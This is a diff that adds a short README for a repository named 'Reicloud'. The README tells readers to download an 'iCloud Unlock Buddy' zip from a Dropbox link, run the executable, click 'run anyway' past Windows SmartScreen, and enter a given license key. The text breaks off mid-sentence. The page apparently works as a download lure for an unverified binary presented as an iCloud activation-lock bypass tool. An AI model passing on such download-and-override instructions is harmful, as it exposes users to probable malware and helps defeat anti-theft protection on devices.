@@ -1,0 +1,2 @@
+# Reicloud
+  To Download your copy of iCloud Unlock Buddy go to: https://www.dropbox.com/s/3r84ztax8wc79gy/iCloud%20Unlock%20Buddy.zip?dl=1  and extract the zip file into your desired directory or double click iCloud Unlock Buddy to launch the application. If Windows SmartScreen prevents you from launching the application click 'more info' and 'run anyway' as shown in the screenshots included with your documentation.     When prompted provide this exact license key: XL2O20KB Do not share this key with anyone, reselling, publicly sharing
